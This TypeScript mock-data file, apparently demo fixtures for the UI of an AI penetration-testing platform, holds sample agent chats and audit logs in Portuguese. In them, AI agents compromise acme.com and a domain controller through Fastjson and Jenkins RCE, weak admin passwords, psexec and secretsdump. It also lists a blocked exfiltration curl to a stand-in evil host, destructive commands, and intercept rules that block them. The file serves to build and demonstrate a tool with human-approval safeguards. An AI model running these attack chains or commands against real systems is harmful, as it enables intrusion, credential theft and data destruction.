  {
    seq: 403,
    worker: "mainagent",
    ts: T("2026-07-25T21:22:08Z"),
    kind: "text",
    summary:
      "Isso: /script sem autenticação dá RCE por Groovy direto. Já injetei uma dica para o worker priorizar o Jenkins — uma vez dominado, dá para exportar as credenciais de domínio e, com o Kerberoasting, partir para o controlador de domínio.",
  },
  {
    seq: 404,
    worker: "mainagent",
    ts: T("2026-07-26T00:22:00Z"),
    kind: "user",
    summary: "O DC01 caiu? Me dá um resumo.",
  },
  {
    seq: 405,
    worker: "mainagent",
    ts: T("2026-07-26T00:22:12Z"),
    kind: "text",
    summary:
      "Confirmado. Caminho do ataque: RCE no Fastjson da loja → elevação na DMZ → exportação das credenciais de domínio pelo Jenkins interno → svc_deploy pertence a Domain Admins → psexec no DC01 como SYSTEM → secretsdump dos hashes de todo o domínio. Os quatro objetivos estão atingidos ou em andamento.",
  },
];

export function activityForTask(): Activity[] {
  return activity;
}

// ── Token stats ──────────────────────────────────────────────────────────────
export const tokenWorkers: TokenUsage[] = [
  {
    worker: "planner",
    input_tokens: 320000,
    output_tokens: 24000,
    cache_read_tokens: 210000,
    cache_write_tokens: 33000,
  },
  {
    worker: "work#1",
    input_tokens: 288000,
    output_tokens: 21000,
    cache_read_tokens: 190000,
    cache_write_tokens: 28000,
  },
  {
    worker: "work#2",
    input_tokens: 402000,
    output_tokens: 31000,
    cache_read_tokens: 280000,
    cache_write_tokens: 41000,
  },
  {
    worker: "work#3",
    input_tokens: 274500,
    output_tokens: 20320,
    cache_read_tokens: 210400,
    cache_write_tokens: 30000,
  },
  { worker: "workG", input_tokens: 88000, output_tokens: 5200, cache_read_tokens: 60000, cache_write_tokens: 8000 },
  { worker: "work#6", input_tokens: 64000, output_tokens: 4100, cache_read_tokens: 42000, cache_write_tokens: 6000 },
  { worker: "work#7", input_tokens: 132000, output_tokens: 8600, cache_read_tokens: 90000, cache_write_tokens: 12000 },
  { worker: "work#8", input_tokens: 74000, output_tokens: 4700, cache_read_tokens: 50000, cache_write_tokens: 7000 },
  { worker: "work#9", input_tokens: 82000, output_tokens: 5100, cache_read_tokens: 56000, cache_write_tokens: 8000 },
  { worker: "work#10", input_tokens: 46000, output_tokens: 3200, cache_read_tokens: 30000, cache_write_tokens: 4500 },
  { worker: "work#11", input_tokens: 96000, output_tokens: 6200, cache_read_tokens: 64000, cache_write_tokens: 9500 },
  { worker: "work#12", input_tokens: 108000, output_tokens: 6800, cache_read_tokens: 72000, cache_write_tokens: 10000 },
  { worker: "work#13", input_tokens: 144000, output_tokens: 9200, cache_read_tokens: 96000, cache_write_tokens: 14000 },
];

// Mirrors TokenStatsBySession: completed usage is keyed by the stable UI session
// (main | plan | intent:<id>) instead of the reusable work#N executor name.
export const tokenSessions: SessionTokenUsage[] = (() => {
  const totals = new Map<string, SessionTokenUsage>();
  for (const item of activity) {
    if (item.kind !== "result") continue;
    let session = "";
    if (item.worker === "mainagent") session = "main";
    else if (item.worker === "planner") session = "plan";
    else if (item.intent_id) session = `intent:${item.intent_id}`;
    if (!session) continue;
    const current = totals.get(session) ?? {
      session,
      input_tokens: 0,
      output_tokens: 0,
      cache_read_tokens: 0,
      cache_write_tokens: 0,
    };
    current.input_tokens += item.input_tokens ?? 0;
    current.output_tokens += item.output_tokens ?? 0;
    current.cache_read_tokens += item.cache_read_tokens ?? 0;
    current.cache_write_tokens += item.cache_write_tokens ?? 0;
    totals.set(session, current);
  }
  return [...totals.values()];
})();

export const tokenTotal: TokenTotal = grandTotal;

export const dailyTokens: DailyTokenBucket[] = Array.from({ length: 30 }, (_, i) => {
  const d = new Date(T("2026-07-26T00:00:00Z"));
  d.setUTCDate(d.getUTCDate() - (29 - i));
  const wave = 40000 + Math.round(30000 * Math.abs(Math.sin(i / 3)));
  return {
    date: d.toISOString().slice(0, 10),
    input_tokens: wave,
    output_tokens: Math.round(wave * 0.08),
    cache_read_tokens: Math.round(wave * 0.7),
    cache_write_tokens: Math.round(wave * 0.12),
  };
});

export const convTokens: ConvTokenSummary[] = [
  {
    llm_profile_id: 1,
    created_at: T("2026-07-25T10:00:00Z"),
    input_tokens: 42000,
    output_tokens: 3800,
    cache_read_tokens: 26000,
    cache_write_tokens: 5200,
  },
  {
    llm_profile_id: 2,
    created_at: T("2026-07-24T16:00:00Z"),
    input_tokens: 18000,
    output_tokens: 1600,
    cache_read_tokens: 9000,
    cache_write_tokens: 2100,
  },
];

// ── Traffic ──────────────────────────────────────────────────────────────────
const exchanges = [
  ["x-1", "www.acme.com", "GET", "https://www.acme.com/", 200, "text/html", 48213],
  ["x-2", "www.acme.com", "GET", "https://www.acme.com/search?q=test", 200, "text/html", 5120],
  ["x-3", "www.acme.com", "GET", "https://www.acme.com/.git/HEAD", 200, "text/plain", 23],
  ["x-4", "admin.acme.com", "GET", "https://admin.acme.com/login", 200, "text/html", 12044],
  ["x-5", "admin.acme.com", "POST", "https://admin.acme.com/login", 302, "text/html", 0],
  ["x-6", "admin.acme.com", "GET", "https://admin.acme.com/dashboard", 200, "text/html", 33120],
  ["x-7", "admin.acme.com", "GET", "https://admin.acme.com/api/users?page=1", 200, "application/json", 8842],
  ["x-8", "api.acme.com", "GET", "https://api.acme.com/v1/orders?id=1001", 200, "application/json", 640],
  ["x-9", "api.acme.com", "GET", "https://api.acme.com/v1/orders?id=1002", 200, "application/json", 655],
  ["x-10", "api.acme.com", "GET", "https://api.acme.com/v1/users/me", 200, "application/json", 312],
  ["x-11", "api.acme.com", "GET", "https://api.acme.com/v1/admin", 401, "application/json", 45],
  ["x-12", "shop.acme.com", "GET", "https://shop.acme.com/checkout", 200, "text/html", 21990],
  ["x-13", "shop.acme.com", "POST", "https://shop.acme.com/pay", 200, "application/json", 128],
  ["x-14", "www.acme.com", "GET", "https://www.acme.com/robots.txt", 200, "text/plain", 88],
  ["x-15", "shop.acme.com", "POST", "https://shop.acme.com/api/import", 500, "application/json", 2048],
  ["x-16", "shop.acme.com", "POST", "https://shop.acme.com/api/import", 200, "application/json", 0],
  ["x-17", "10.10.10.20", "GET", "http://10.10.10.20:8080/script", 200, "text/html", 14200],
  ["x-18", "10.10.10.20", "POST", "http://10.10.10.20:8080/scriptText", 200, "text/plain", 86],
  ["x-19", "10.10.10.10", "POST", "https://10.10.10.10:445/psexec", 200, "application/octet-stream", 0],
] as const;

export const traffic: TrafficResp = {
  enabled: true,
  proxy: ":8788",
  count: exchanges.length,
  total: exchanges.length,
  page: 0,
  size: 100,
  exchanges: exchanges.map(([id, host, method, url, status, ct, len], i) => ({
    id,
    host,
    method,
    url,
    status,
    content_type: ct,
    resp_len: len,
    ts: T(`2026-07-26T0${1 + (i % 3)}:${String(10 + i).padStart(2, "0")}:00Z`),
  })),
};

// Distinct hosts with counts, derived from the exchanges above (target picker).
const hostCounts: Record<string, number> = {};
for (const [, host] of exchanges) hostCounts[host] = (hostCounts[host] ?? 0) + 1;
export const trafficHosts: TrafficHost[] = Object.entries(hostCounts).map(([host, count]) => ({ host, count }));

export const trafficDetail: TrafficDetail = {
  req: `GET /v1/orders?id=1002 HTTP/1.1
Host: api.acme.com
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
User-Agent: ARTEX-worker/1.0
Accept: application/json

`,
  resp: `HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 655

{
  "order_id": 1002,
  "user_id": 77,
  "amount": 1299.00,
  "address": "Av. Paulista, 1000 — São Paulo ****",
  "phone": "138****6021",
  "items": [{ "sku": "A-100", "qty": 1 }]
}`,
};

// ── Security / Audit ─────────────────────────────────────────────────────────
export const audit: Audit = {
  attributions: { allow: 312, block: 9 },
  entries: [
    {
      ts: T("2026-07-26T03:33:00Z"),
      tool: "bash",
      action: "allow",
      command: "curl -s -d 'username=admin...' https://admin.acme.com/login",
    },
    {
      ts: T("2026-07-26T03:57:00Z"),
      tool: "bash",
      action: "allow",
      command: "curl -s -b 'session=...' https://admin.acme.com/api/users",
    },
    {
      ts: T("2026-07-26T02:10:00Z"),
      tool: "bash",
      action: "block",
      reason: "Fora do escopo: out.evil.example não está no escopo",
      command: "curl https://out.evil.example/exfil",
    },
    {
      ts: T("2026-07-25T22:03:00Z"),
      tool: "bash",
      action: "allow",
      command: "sqlmap -u 'https://www.acme.com/search?q=1' --batch",
    },
    {
      ts: T("2026-07-25T21:00:00Z"),
      tool: "bash",
      action: "block",
      reason: "Controle de ação destrutiva: rm -rf recusado",
      command: "rm -rf /var/www",
    },
    {
      ts: T("2026-07-25T20:30:00Z"),
      tool: "bash",
      action: "allow",
      command: "git-dumper https://www.acme.com/.git/ /tmp/acme",
    },
    {
      ts: T("2026-07-25T15:20:00Z"),
      tool: "bash",
      action: "allow",
      command:
        "curl -s -H 'Content-Type: application/json' -d '{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"...}' https://shop.acme.com/api/import",
    },
    {
      ts: T("2026-07-25T21:40:00Z"),
      tool: "bash",
      action: "allow",
      command: "curl -s -d 'script=println+\"whoami\"...' http://10.10.10.20:8080/scriptText",
    },
    {
      ts: T("2026-07-26T00:00:00Z"),
      tool: "bash",
      action: "allow",
      command: "impacket-psexec acme.local/svc_deploy@10.10.10.10",
    },
    {
      ts: T("2026-07-26T00:05:00Z"),
      tool: "bash",
      action: "block",
      reason: "Controle de exfiltração: secretsdump exige aprovação humana",
      command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc",
    },
    {
      ts: T("2026-07-26T00:06:00Z"),
      tool: "bash",
      action: "allow",
      command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc  # liberado após aprovação",
    },
  ],
};

// ── LLM profiles ─────────────────────────────────────────────────────────────
export const llmProfiles: LLMProfile[] = [
  {
    id: "1",
    name: "Claude Opus 4.8",
    format: "anthropic",
    model: "claude-opus-4-8",
    api_key_hint: "…a3f2",
    rate_per_second: 0,
    rate_per_minute: 0,
    context_window_k: 1000,
    thinking_type: "enabled",
    reasoning_effort: "high",
    is_default: true,
    priority: 0,
    pool_exclude: false,
    // O nome do campo da anthropic é fixo, então max_tokens_field é sempre vazio.
    max_tokens: 0,
    max_tokens_field: "",
  },
  {
    id: "2",
    name: "DeepSeek V4",
    format: "openai",
    base_url: "https://api.deepseek.com",
    model: "deepseek-v4-flash",
    api_key_hint: "…9c11",
    rate_per_second: 0,
    rate_per_minute: 60,
    context_window_k: 128,
    thinking_type: "",
    reasoning_effort: "",
    is_default: false,
    priority: 10,
    pool_exclude: false,
    // Formato openai + modelo de raciocínio: o limite vai por max_completion_tokens.
    max_tokens: 8192,
    max_tokens_field: "max_completion_tokens",
  },
];

export const llmConfig = {
  configured: true,
  provider: "anthropic",
  model: "claude-opus-4-8",
  base_url: "",
  proxy: "",
  key_set: true,
  rate_per_second: 0,
  rate_per_minute: 0,
  context_window_k: 1000,
  thinking_type: "enabled",
  reasoning_effort: "high",
};

// ── Agents ───────────────────────────────────────────────────────────────────
export const agents: Agent[] = [
  {
    id: "1001",
    key: "retester",
    name: "Reteste de vulnerabilidade",
    role: "assistant",
    builtin: false,
    enabled: true,
    description: "Disparado manualmente do detalhe da vulnerabilidade; guarda uma conclusão de reteste independente",
    max_turns: 0,
    mcp_count: 0,
    skill_count: 0,
    tool_count: 2,
  },
  {
    id: "1",
    key: "goals",
    name: "Decompositor de objetivos",
    role: "goals",
    builtin: true,
    enabled: true,
    description: "Divide o objetivo da tarefa em subobjetivos exploráveis",
    max_turns: 8,
    mcp_count: 0,
    skill_count: 1,
    tool_count: 3,
  },
  {
    id: "2",
    key: "planner",
    name: "Planejador",
    role: "planner",
    builtin: true,
    enabled: true,
    description: "Lê a rota de exploração, julga se o objetivo foi atingido e gera intenções",
    max_turns: 0,
    mcp_count: 1,
    skill_count: 2,
    tool_count: 9,
  },
  {
    id: "3",
    key: "mainagent",
    name: "Agent principal",
    role: "mainagent",
    builtin: true,
    enabled: true,
    description: "Conversa com a pessoa no circuito, injetando dicas e intenções de alta prioridade",
    max_turns: 0,
    web_search: true,
    mcp_count: 2,
    skill_count: 3,
    tool_count: 11,
  },
  {
    id: "4",
    key: "worker",
    name: "Work Agent",
    role: "worker",
    builtin: true,
    enabled: true,
    description: "Reivindica a intenção → roda as ferramentas do Kali → escreve de volta no grafo",
    max_turns: 40,
    run_seconds: 1800,
    web_search: false,
    interactive_shell: true,
    mcp_count: 2,
    skill_count: 3,
    tool_count: 14,
  },
  {
    id: "5",
    key: "recon-bot",
    name: "Robô de reconhecimento (personalizado)",
    role: "custom",
    builtin: false,
    enabled: true,
    description: "Faz reconhecimento passivo periódico dos ativos novos",
    max_turns: 12,
    mcp_count: 1,
    skill_count: 1,
    tool_count: 4,
  },
];

const promptVars: PromptVar[] = [
  {
    name: "Goal",
    description: "Objetivo atual da tarefa",
    example: "Obter acesso de administrador ao painel de acme.com",
    source: "runtime",
  },
  {
    name: "AssetSummary",
    description: "Visão geral do grafo de ativos",
    example: "6 subdomínios / 3 IPs / 4 aplicações / 4 endpoints",
    source: "distilled",
  },
  {
    name: "RouteHint",
    description: "Dica de rota de exploração",
    example: "Priorizar o painel e a superfície de escalada da API",
    source: "exploration",
  },
];

const promptVersions: PromptVersion[] = [
  {
    version: 3,
    ts: T("2026-07-25T10:00:00Z"),
    note: "Reforça a orientação de sondagem de escalada de privilégio",
    template_text: "Você é o planejador do ARTEX…",
  },
  {
    version: 2,
    ts: T("2026-07-20T10:00:00Z"),
    note: "Ajuste fino da primeira versão",
    template_text: "Você é o planejador do ARTEX (v2)…",
  },
];

export function agentDetail(key: string): AgentDetail {
  const a = agents.find((x) => x.key === key) ?? agents[1];
  return {
    agent: a,
    prompt: `Você é o "${a.name}" do ARTEX.\nObjetivo: {{.Goal}}\nVisão geral dos ativos: {{.AssetSummary}}\nDica de rota: {{.RouteHint}}\nAvance a exploração com base nisso e escreva os resultados de volta no grafo usando as ferramentas.`,
    variables: promptVars,
    versions: promptVersions,
    visibility: { mcp: [1, 2], skill: ["api-recon", "playwright-cli"] },
    wrapup_prompt: "",
    wrapup_default:
      "O tempo ou os passos estão no fim: resuma os achados confirmados e marque o estado final das intenções.",
    wrapup_max_turns: 0,
    wrapup_max_turns_default: 3,
    task_timeout_wrapup_supported: a.key === "worker" || a.key === "planner",
    task_timeout_wrapup_default: "A tarefa expirou: encerre agora e grave as conclusões atuais.",
    task_timeout_wrapup_max_turns_default: 2,
  };
}

// ── MCP ──────────────────────────────────────────────────────────────────────
export const mcpServers: MCPServer[] = [
  {
    id: 1,
    name: "shodan",
    transport: "http",
    url: "https://mcp.shodan.io/sse",
    args: [],
    env: {},
    enabled: true,
    tools: ["host_info", "search", "dns_resolve"],
  },
  {
    id: 2,
    name: "playwright",
    transport: "stdio",
    command: "npx",
    args: ["-y", "@playwright/mcp"],
    env: {},
    enabled: true,
    tools: ["browser_navigate", "browser_click", "browser_snapshot"],
  },
];

export const mcpToolsById: Record<number, MCPTool[]> = {
  1: [
    { name: "host_info", description: "Consulta no Shodan as informações de host de um IP" },
    { name: "search", description: "Busca no Shodan" },
    { name: "dns_resolve", description: "Resolução de DNS" },
  ],
  2: [
    { name: "browser_navigate", description: "Abre uma URL no navegador" },
    { name: "browser_click", description: "Clica em um elemento" },
    { name: "browser_snapshot", description: "Captura um instantâneo de acessibilidade" },
  ],
};

// ── Skills ───────────────────────────────────────────────────────────────────
export const skills: SkillItem[] = [
  {
    name: "api-recon",
    description:
      "Faz reconhecimento de APIs REST/GraphQL e enumera a superfície de escalada; use ao descobrir um endpoint novo.",
    license: "MIT",
    mcps: [],
    files: ["SKILL.md", "scripts/enum.py"],
    calls: 24,
    tasks: 6,
    usage_agents: ["worker", "planner"],
    last_used: T("2026-08-20T09:12:00Z"),
  },
  {
    name: "playwright-cli",
    description:
      "Usa o Playwright para rastrear e capturar telas dinamicamente; use quando o site precisar renderizar JS.",
    mcps: ["playwright"],
    files: ["SKILL.md"],
    calls: 7,
    tasks: 3,
    usage_agents: ["worker"],
    last_used: T("2026-08-19T21:40:00Z"),
  },
  {
    name: "scopesentry",
    description: "Puxa ativos do ScopeSentry e os consolida no escopo da empresa; use para importar ativos em lote.",
    files: ["SKILL.md", "assets/mapping.md"],
    calls: 0,
    tasks: 0,
    usage_agents: [],
  },
];

export const skillCalls: SkillCall[] = [
  { ts: T("2026-08-20T09:12:00Z"), agent_key: "worker", task_id: 42, session_id: "", args_len: 128 },
  { ts: T("2026-08-20T08:03:00Z"), agent_key: "planner", task_id: 42, session_id: "", args_len: 0 },
  { ts: T("2026-08-19T17:55:00Z"), agent_key: "worker", task_id: 37, session_id: "", args_len: 64 },
];

export const missingSkills: MissingSkill[] = [
  { skill: "jwt-forge", calls: 3, agents: ["worker"], last_used: T("2026-08-20T07:20:00Z") },
];

// ── Tools ────────────────────────────────────────────────────────────────────
export const tools: Tool[] = [
  {
    key: "bash",
    system: true,
    description: "Executa comandos de shell no ambiente Kali (sujeito aos controles de escopo e de ação destrutiva)",
    schema: { type: "object", properties: { command: { type: "string" } }, required: ["command"] },
    agents: ["worker", "mainagent"],
    enabled: true,
    kind: "builtin",
    calls: 1842,
  },
  {
    key: "report_finding",
    system: true,
    description: "Registra um achado de segurança e o liga aos nós relacionados",
    schema: {
      type: "object",
      properties: {
        vulnclass: { type: "string" },
        severity: { type: "string" },
        summary: { type: "string" },
        evidence: { type: "string" },
      },
      required: ["vulnclass", "severity", "summary"],
    },
    agents: ["worker"],
    enabled: true,
    kind: "builtin",
    calls: 96,
  },
  {
    key: "upsert_asset",
    system: true,
    description: "Grava ou atualiza um nó de ativo",
    schema: { type: "object", properties: { type: { type: "string" }, value: { type: "string" } } },
    agents: ["worker"],
    enabled: true,
    kind: "builtin",
    calls: 417,
  },
  {
    key: "list_goals",
    system: true,
    description: "Lista os objetivos da tarefa atual e seu status de conclusão",
    schema: { type: "object", properties: {} },
    agents: ["planner"],
    enabled: true,
    kind: "builtin",
    calls: 238,
  },
  {
    key: "nuclei_scan",
    system: false,
    description: "Personalizada: roda o nuclei com um template específico",
    schema: {
      type: "object",
      properties: { target: { type: "string" }, template: { type: "string" } },
      required: ["target"],
    },
    agents: ["worker"],
    enabled: true,
    kind: "command",
    exec: { command: "nuclei", args: ["-u", "{{target}}"] },
    calls: 31,
  },
];

// ── Settings ─────────────────────────────────────────────────────────────────
export const settings: Settings = {
  traffic_capture: true,
  agent_traffic_binding: false,
  llm_record: false,
  web_search_enabled: true,
  web_search_backend: "ddgs",
  brave_key_set: false,
  tavily_key_set: true,
  web_search_proxy: "",
  global_proxy: "",
  python_interpreter: "/usr/bin/python3",
  workers: 3,
  llm_pool_enabled: true,
  llm_pool_bind_fallback: false,
  noa_compaction: false,
};

// ── Rodízio de LLM (failover) ──────────────────────────────────────────────────────
// demo: a configuração ativa está normal, e a configuração reserva acabou de acionar o breaker por saldo insuficiente e está em cooldown.
export const llmPool: LLMPoolStatus = {
  enabled: true,
  bind_fallback: false,
  chain: [
    {
      profile_id: "1",
      name: "Claude Opus 4.8",
      model: "claude-opus-4-8",
      format: "anthropic",
      priority: 0,
      active: true,
      excluded: false,
      state: "ok",
      fails: 0,
      trips: 0,
      cooldown_secs: 0,
    },
    {
      profile_id: "2",
      name: "DeepSeek V4",
      model: "deepseek-v4-flash",
      format: "openai",
      priority: 10,
      active: false,
      excluded: false,
      state: "tripped",
      fails: 0,
      trips: 1,
      cooldown_secs: 42,
      last_error: "openai: status 402: insufficient balance",
      last_at: T("2026-07-26T00:10:00Z"),
    },
  ],
};

// ── Intercept ────────────────────────────────────────────────────────────────
export const interceptRules: InterceptRule[] = [
  {
    id: 1,
    name: "Comando destrutivo exige aprovação",
    enabled: true,
    priority: 10,
    match_target: "tool_input",
    match_type: "regex",
    pattern: "rm\\s+-rf|mkfs|dd\\s+if=",
    action: "ask",
    message: "Comando destrutivo detectado: exige aprovação humana",
    timeout_enabled: true,
    timeout_seconds: 120,
    timeout_action: "deny",
    created_at: T("2026-07-20T10:00:00Z"),
    updated_at: T("2026-07-20T10:00:00Z"),
  },
  {
    id: 2,
    name: "Tráfego de saída recusado",
    enabled: true,
    priority: 20,
    match_target: "tool_input",
    match_type: "string",
    pattern: "exfil",
    action: "deny",
    message: "Suspeita de envio de dados para fora",
    timeout_enabled: false,
    timeout_seconds: 0,
    timeout_action: "deny",
    created_at: T("2026-07-21T10:00:00Z"),
    updated_at: T("2026-07-21T10:00:00Z"),
  },
];

export const interceptPending: InterceptPending[] = [
  {
    id: 101,
    rule_id: 1,
    task_id: "t-acme-web",
    agent_name: "work#3",
    tool_name: "bash",
    tool_input: { command: "mysqldump -h 203.0.113.10 -uroot acme_prod > /tmp/dump.sql" },
    status: "pending",
    reason: "Controle de exfiltração: exportar o banco inteiro exige aprovação humana",
    created_at: T("2026-07-26T03:58:00Z"),
  },
];

export const interceptHistory: InterceptApprovalRow[] = [
  {
    id: 90,
    rule_id: 1,
    task_id: "t-acme-web",
    agent_name: "work#1",
    tool_name: "bash",
    tool_input: { command: "dd if=/dev/zero of=/tmp/x" },
    status: "denied",
    reason: "Comando destrutivo exige aprovação",
    created_at: T("2026-07-25T20:00:00Z"),
    decided_at: T("2026-07-25T20:01:00Z"),
    conv_title: "",
    conv_agent_key: "",
    rule_name: "Comando destrutivo exige aprovação",
  },
  {
    id: 91,
    task_id: "t-acme-api",
    agent_name: "work#2",
    tool_name: "bash",
    tool_input: { command: "rm -rf /var/www/html" },
    status: "denied",
    reason: "[Modelo] Exclusão de arquivo de produção do alvo (D4)",
    created_at: T("2026-07-25T18:00:00Z"),
    decided_at: T("2026-07-25T18:00:05Z"),
    conv_title: "",
    conv_agent_key: "",
    rule_name: "",
  },
  {
    id: 92,
    rule_id: 2,
    task_id: "t-acme-web",
    agent_name: "work#13",
    tool_name: "bash",
    tool_input: { command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc" },
    status: "allowed",
    reason: "Tráfego de saída recusado",
    created_at: T("2026-07-26T00:05:00Z"),
    decided_at: T("2026-07-26T00:06:00Z"),
    conv_title: "",
    conv_agent_key: "",
    rule_name: "Tráfego de saída recusado",
  },
  {
    id: 93,
    task_id: "t-acme-web",
    agent_name: "work#7",
    tool_name: "bash",
    tool_input: { command: 'mysql -e "DROP TABLE users_bak_0921"' },
    status: "pending",
    reason: "[Modelo] Parece tabela de backup; não dá para afirmar se é dado de produção",
    created_at: T("2026-07-25T15:14:00Z"),
    conv_title: "",
    conv_agent_key: "",
    rule_name: "",
  },
];

// Approval detail fixtures use harmless report-writing examples.
interceptHistory.unshift({
  id: 94,
  task_id: "t-acme-web",
  agent_name: "work#1",
  tool_name: "Write",
  tool_input: {
    path: "reports/summary.md",
    content:
      "# Resumo da verificação\n\nEsta rodada de validação foi concluída; seguem as evidências reunidas e as recomendações.",
  },
  status: "allowed",
  decision_source: "model",
  reason: "[Modelo] Grava as conclusões já apuradas em um relatório local, sem alterar dados de negócio.",
  created_at: T("2026-07-26T08:00:00Z"),
  decided_at: T("2026-07-26T08:00:02Z"),
  conv_title: "",
  conv_agent_key: "",
  rule_name: "",
});

export const interceptDetails: Record<number, InterceptAudit> = {
  94: {
    run_id: "demo-run-report",
    tool_use_id: "call-write-report",
    correlation: "exact",
    input_digest: "a3b458eca3b458eca3b458eca3b458eca3b458eca3b458eca3b458eca3b458ec1234",
    user_message:
      "Organize as verificações já concluídas e escreva as conclusões e o índice de evidências em reports/summary.md.\nMantenha os itens pendentes de validação e não altere dados de negócio.",
    context: [
      { kind: "user", text: "Consolide as evidências desta rodada e gere o resumo da verificação." },
      {
        kind: "tool_use",
        tool: "Read",
        tool_use_id: "call-read-evidence",
        text: '{"path":"reports/evidence-index.json"}',
      },
      {
        kind: "tool_result",
        tool: "Read",
        tool_use_id: "call-read-evidence",
        text: "Li 3 entradas do índice de evidências.\nCada registro traz o horário da requisição, o resumo do resultado e o caminho do arquivo local.",
      },
    ],
    captured_at: T("2026-07-26T08:00:00Z"),
    initial_action: "allow",
    initial_reason: "[Modelo] Grava as conclusões já apuradas em um relatório local, sem alterar dados de negócio.",
    effective_action: "allow",
    config_digest: "b4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fd1234",
    profile_id: 1,
    execution_status: "succeeded",
    output: "Successfully wrote reports/summary.md\n68 caracteres gravados.",
    execution_ended_at: T("2026-07-26T08:00:03Z"),
  },
  93: {
    run_id: "demo-run-review",
    tool_use_id: "call-pending-review",
    correlation: "exact",
    input_digest: "c5d670aec5d670aec5d670aec5d670aec5d670aec5d670aec5d670aec5d670ae1234",
    user_message: "Verifique para que serve a tabela de backup; qualquer exclusão precisa de confirmação antes.",
    context: [],
    captured_at: T("2026-07-25T15:14:00Z"),
    initial_action: "ask",
    initial_reason: "[Modelo] Parece tabela de backup; não dá para afirmar se é dado de produção.",
    profile_id: 1,
    execution_status: "not_started",
  },
};

// ── Conversations (chat) ─────────────────────────────────────────────────────
export const conversations: Conversation[] = [
  {
    id: 1,
    agent_key: "mainagent",
    title: "Discussão sobre o ponto de entrada no painel da acme",
    llm_profile_id: 1,
    pinned: true,
    pinned_at: T("2026-07-26T04:00:00Z"),
    created_at: T("2026-07-25T10:00:00Z"),
    updated_at: T("2026-07-26T03:40:00Z"),
  },
  {
    id: 2,
    agent_key: "mainagent",
    title: "Levantamento da superfície de escalada na API",
    llm_profile_id: 2,
    created_at: T("2026-07-24T16:00:00Z"),
    updated_at: T("2026-07-24T17:20:00Z"),
  },
  {
    id: 3,
    agent_key: "mainagent",
    title: "Lateralização interna · plano de ataque da DMZ ao controlador de domínio",
    llm_profile_id: 1,
    created_at: T("2026-07-25T15:45:00Z"),
    updated_at: T("2026-07-26T00:25:00Z"),
  },
];

export const conversationMessages: Record<number, Activity[]> = {
  1: [
    {
      seq: 1,
      worker: "user",
      ts: T("2026-07-25T10:00:00Z"),
      kind: "user",
      summary: "Onde fica o painel e por onde começo?",
    },
    {
      seq: 2,
      worker: "mainagent",
      ts: T("2026-07-25T10:00:04Z"),
      kind: "thinking",
      summary:
        "Primeiro confirmo a pilha e as proteções da página de login de admin.acme.com (captcha e limite de taxa), depois decido entre senhas padrão e dicionário.",
    },
    {
      seq: 3,
      worker: "mainagent",
      ts: T("2026-07-25T10:00:06Z"),
      kind: "tool_use",
      tool: "bash",
      tool_use_id: "c11",
      summary: "curl -s https://admin.acme.com/login | grep -Eo 'element-ui|captcha|csrf'",
    },
    {
      seq: 4,
      worker: "mainagent",
      ts: T("2026-07-25T10:00:08Z"),
      kind: "tool_result",
      tool: "bash",
      tool_use_id: "c11",
      summary: "element-ui\ncsrf",
      detail: "Painel em Element-UI, com token CSRF mas sem captcha.",
    },
    {
      seq: 5,
      worker: "mainagent",
      ts: T("2026-07-25T10:00:20Z"),
      kind: "tool_use",
      tool: "bash",
      tool_use_id: "c12",
      summary:
        "for i in 1 2 3 4 5; do curl -s -o /dev/null -w '%{http_code}\\n' -d 'username=x&password=y' https://admin.acme.com/login; done",
    },
    {
      seq: 6,
      worker: "mainagent",
      ts: T("2026-07-25T10:00:24Z"),
      kind: "tool_result",
      tool: "bash",
      tool_use_id: "c12",
      summary: "401\\n401\\n401\\n401\\n401",
      detail: "Cinco tentativas seguidas sem bloqueio e sem captcha → não há limite de taxa, dá para forçar.",
    },
    {
      seq: 7,
      worker: "mainagent",
      ts: T("2026-07-25T10:00:30Z"),
      kind: "text",
      summary:
        'Conclusão: painel Element-UI, sem captcha e sem limite de taxa. Ordem de ataque: (1) rodar a lista de senhas padrão (admin/admin, admin/admin123, admin/123456); (2) se não acertar, partir para o dicionário top1000. Já injetei "teste de senha padrão no painel" como intenção de alta prioridade para o work agent.',
    },
    { seq: 8, worker: "user", ts: T("2026-07-26T03:40:00Z"), kind: "user", summary: "Funcionou?" },
    {
      seq: 9,
      worker: "mainagent",
      ts: T("2026-07-26T03:40:05Z"),
      kind: "text",
      summary:
        'Funcionou: admin/admin123 entrou direto no console. Já registrei como achado de severidade alta e isso prova o objetivo "obter acesso de administrador ao painel". O próximo passo é partir para a leitura dos dados de usuários (objetivo 2).',
    },
  ],
  2: [
    {
      seq: 1,
      worker: "user",
      ts: T("2026-07-24T16:00:00Z"),
      kind: "user",
      summary: "Me ajuda a levantar a superfície de escalada de privilégio de api.acme.com.",
    },
    {
      seq: 2,
      worker: "mainagent",
      ts: T("2026-07-24T16:00:05Z"),
      kind: "thinking",
      summary:
        "Primeiro entendo o método de autenticação da API e o comportamento de alguns endpoints-chave, depois avalio o risco de IDOR e de JWT.",
    },
    {
      seq: 3,
      worker: "mainagent",
      ts: T("2026-07-24T16:00:10Z"),
      kind: "tool_use",
      tool: "bash",
      tool_use_id: "c21",
      summary: "curl -s https://api.acme.com/v1/users/me -H 'Authorization: Bearer <self>' | jq '{id,role}'",
    },
    {
      seq: 4,
      worker: "mainagent",
      ts: T("2026-07-24T16:00:12Z"),
      kind: "tool_result",
      tool: "bash",
      tool_use_id: "c21",
      summary: '{ "id": 42, "role": "user" }',
      detail: "O token de usuário comum funciona.",
    },
    {
      seq: 5,
      worker: "mainagent",
      ts: T("2026-07-24T16:00:30Z"),
      kind: "tool_use",
      tool: "bash",
      tool_use_id: "c22",
      summary: "echo '<jwt>' | cut -d. -f1 | base64 -d; # ver o algoritmo",
    },
    {
      seq: 6,
      worker: "mainagent",
      ts: T("2026-07-24T16:00:31Z"),
      kind: "tool_result",
      tool: "bash",
      tool_use_id: "c22",
      summary: '{"alg":"HS256","typ":"JWT"}',
      detail: "Assinatura simétrica HS256: se a chave for fraca, dá para quebrar offline e forjar.",
    },
    {
      seq: 7,
      worker: "mainagent",
      ts: T("2026-07-24T16:01:00Z"),
      kind: "text",
      summary:
